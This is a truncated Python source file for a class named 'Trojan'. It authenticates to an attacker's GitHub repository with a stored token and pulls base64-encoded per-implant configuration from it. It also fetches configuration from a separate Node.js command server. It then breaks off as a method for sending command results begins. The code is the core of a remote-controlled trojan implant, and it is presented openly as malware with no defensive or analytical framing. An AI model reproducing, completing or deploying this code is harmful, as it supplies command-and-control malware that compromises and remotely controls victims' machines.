import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import subprocess
import requests
from datetime import datetime

def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hacksparkdev'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')

def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id, node_server_url):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{self.id}/'
        self.repo = github_connect()
        self.node_server_url = node_server_url
        self.running = True

    def get_github_config(self):
        try:
            config_json = get_file_contents('config', self.config_file, self.repo)
            decoded_config = base64.b64decode(config_json).decode('utf-8')
            return json.loads(decoded_config)
        except Exception as e:
            print(f"Error fetching GitHub config: {e}")
            raise

    def get_nodejs_config(self):
        try:
            response = requests.get(f"{self.node_server_url}/config")
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"[*] Failed to get config from Node.js server: {e}")
            return None

    def send_command_result(self, comm

